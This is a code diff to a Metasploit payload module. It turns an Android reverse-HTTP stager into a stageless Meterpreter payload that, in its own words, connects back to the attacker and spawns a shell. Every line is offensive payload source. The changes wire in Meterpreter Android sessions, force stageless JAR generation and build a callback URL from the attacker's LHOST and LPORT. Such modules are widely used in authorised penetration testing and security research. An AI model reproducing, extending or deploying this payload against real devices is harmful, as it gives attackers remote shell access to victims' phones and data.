@@ -5,27 +5,39 @@
 
 require 'msf/core'
 require 'msf/core/handler/reverse_http'
+require 'msf/core/payload/transport_config'
+require 'msf/core/payload/android'
 require 'msf/core/payload/uuid/options'
+require 'msf/base/sessions/meterpreter_android'
+require 'msf/base/sessions/meterpreter_options'
+require 'rex/payloads/meterpreter/config'
 
 module MetasploitModule
 
   CachedSize = :dynamic
 
-  include Msf::Payload::Stager
+  include Msf::Payload::TransportConfig
+  include Msf::Payload::Single
   include Msf::Payload::Android
   include Msf::Payload::UUID::Options
+  include Msf::Sessions::MeterpreterOptions
+
 
   def initialize(info = {})
+
     super(merge_info(info,
-      'Name'        => 'Android Reverse HTTP Stager',
-      'Description' => 'Tunnel communication over HTTP',
-      'Author'      => ['anwarelmakrahy', 'OJ Reeves'],
+      'Name'        => 'Android Meterpreter Shell, Reverse HTTP Inline',
+      'Description' => 'Connect back to attacker and spawn a Meterpreter shell',
       'License'     => MSF_LICENSE,
       'Platform'    => 'android',
       'Arch'        => ARCH_DALVIK,
       'Handler'     => Msf::Handler::ReverseHttp,
-      'Stager'      => {'Payload' => ''}
-    ))
+      'Session'     => Msf::Sessions::Meterpreter_Java_Android,
+      'Payload'     => '',
+      ))
+    register_options([
+      OptBool.new('AutoLoadAndroid', [true, "Automatically load the Android extension", true])
+    ], self.class)
   end
 
   #
@@ -33,6 +45,11 @@ module MetasploitModule
   #
   def transport_config(opts={})
     transport_config_reverse_http(opts)
+  end
+
+  def generate_jar(opts={})
+    opts[:stageless] = true
+    super(opts)
   end
 
   def payload_uri(req=nil)
@@ -45,7 +62,7 @@ module MetasploitModule
 
     url = "http://#{datastore["LHOST"]}:#{datastore["LPORT"]}#{luri}"
     # TODO: perhaps wire in an existing UUID from opts?
-    url << generate_uri_uuid_mode(:init_java, uri_req_len)
+    url << generate_uri_uuid_mode(:init_connect, uri_req_len)
 
     url
   end
